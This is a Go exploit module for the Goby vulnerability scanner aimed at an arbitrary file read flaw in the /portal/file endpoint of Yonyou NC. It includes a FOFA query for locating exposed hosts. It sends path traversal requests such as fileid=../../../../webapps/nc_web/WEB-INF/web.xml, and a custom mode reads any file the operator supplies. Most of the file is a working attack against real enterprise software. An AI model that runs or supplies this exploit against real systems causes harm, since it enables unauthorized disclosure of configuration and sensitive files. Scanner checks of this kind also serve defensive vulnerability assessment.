package exploits

import (
	"errors"
	"fmt"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC /portal/file  File Read Vulnerability",
    "Description": "<p>                                                            </p><p>                                        <a href=\"https://fanyi.baidu.com/translate?ext_channel=DuSearch###\"></a>                                                                                    <a></a>                                    </p><p>                                                                                            </p><p>                                </p><p>    </p><p>                                           </p><p> Yonyou NC, abbreviated as Enterprise Resource Planning, refers to a set of enterprise management software developed by Yonyou Software Co., Ltd. The Yonyou NC system is an information technology solution that integrates and manages various business processes in enterprises. This system covers multiple aspects such as finance, human resources, and supply chain management, aiming to help enterprises improve operational efficiency, optimize resource utilization, and enhance management level.  </p><p>     </p><p>     </p><p> Vulnerability hazard: There is an arbitrary file reading vulnerability in the Yonyou NC system/portal/file interface, which malicious attackers may exploit to obtain sensitive information and cause harm to the system.  </p>",
    "Product": "yonyou-NC-OA-V5.72SP1",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-05-17",
    "PostTime": "2024-05-21",
    "Author": "16635329173@163.com",
    "FofaQuery": "title==\"产品登录界面\" || body=\"/images/ufida_nc.png\"",
    "GobyQuery": "title==\"产品登录界面\" || body=\"/images/ufida_nc.png\"",
    "Level": "1",
    "Impact": "<p> There is an arbitrary file reading vulnerability in the Yonyou NC system/portal/file interface, which malicious attackers may exploit to obtain sensitive information and cause harm to the system.</p>",
    "Recommendation": "<p>                                                                                                </p><p>                                        <a href=\"https://fanyi.baidu.com/translate?ext_channel=DuSearch###\"></a>                                                                                    <a></a>                                    </p><p>                                                                                            </p><p>                                </p><p>    </p><p>                                           </p><p> Update to the latest version: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a>  </p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize,web.xml,default.jsp",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "Burp",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "VulURL|lastbody|regex|{{{fixedhostinfo}}}\\\"/portal/file\\\""
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "filename",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "用友NC /portal/file 文件读取漏洞",
            "Product": "用友NC-OA-V5.72SP1",
            "Description": "<p>用友NC是“企业资源规划（Enterprise Resource Planning）”的缩写，是指用友软件股份有限公司开发的一套企业管理软。用友NC系统是一种集成管理企业各项业务流程的信息化解决方案。该系统涵盖了财务、人力资源、供应链管理等多个方面，旨在帮助企业提高运营效率、优化资源利用、提升管理水平。</p><p>漏洞危害：用友NC 系统 /portal/file接口存在任意文件读取漏洞，恶意攻击者可能会利用此漏洞获取敏感信息，对系统造成危害。</p>",
            "Recommendation": "<p>更新至最新版本：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
            "Impact": "<p>用友NC 系统 /portal/file接口存在任意文件读取漏洞，恶意攻击者可能会利用此漏洞获取敏感信息，对系统造成危害。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Yonyou NC /portal/file  File Read Vulnerability",
            "Product": "yonyou-NC-OA-V5.72SP1",
            "Description": "<p>                                                            </p><p>                                        <a href=\"https://fanyi.baidu.com/translate?ext_channel=DuSearch###\"></a>                                                                                    <a></a>                                    </p><p>                                                                                            </p><p>                                </p><p>    </p><p>                                           </p><p> Yonyou NC, abbreviated as Enterprise Resource Planning, refers to a set of enterprise management software developed by Yonyou Software Co., Ltd. The Yonyou NC system is an information technology solution that integrates and manages various business processes in enterprises. This system covers multiple aspects such as finance, human resources, and supply chain management, aiming to help enterprises improve operational efficiency, optimize resource utilization, and enhance management level.  </p><p>     </p><p>     </p><p> Vulnerability hazard: There is an arbitrary file reading vulnerability in the Yonyou NC system/portal/file interface, which malicious attackers may exploit to obtain sensitive information and cause harm to the system.  </p>",
            "Recommendation": "<p>                                                                                                </p><p>                                        <a href=\"https://fanyi.baidu.com/translate?ext_channel=DuSearch###\"></a>                                                                                    <a></a>                                    </p><p>                                                                                            </p><p>                                </p><p>    </p><p>                                           </p><p> Update to the latest version: <a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a>  </p>",
            "Impact": "<p>&nbsp;There is an arbitrary file reading vulnerability in the Yonyou NC system/portal/file interface, which malicious attackers may exploit to obtain sensitive information and cause harm to the system.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10953"
}`

	postOrGet_AAAAA := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		head := map[string]string{
			"Accept-Encoding": "gzip, deflate",
		}
		url := "/portal/file?cmd=getFileLocal&fileid=" + fileUrl
		rep, err := setGetRequest(hostInfo, url, head)
		if err != nil {
			return "", err

		} else if !strings.Contains(rep.HeaderString.String(), "filename") {

			return "", errors.New("没有读取到文件")
		}

		respTxt = rep.Utf8Html
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/portal/file"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../../../../webapps/nc_web/WEB-INF/web.xml": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
			}
			// 函数继承
			uploadFileFunc := postOrGet_AAAAA

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.xml":     {"../../../../webapps/nc_web/WEB-INF/web.xml", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"},
				"default.jsp": {"../../../../webapps/nc_web/default.jsp", "<%@"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_AAAAA

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
					fmt.Println(fileUrl)
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || !strings.Contains(resp, fileText) && mode != "Customize" {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		}))
}
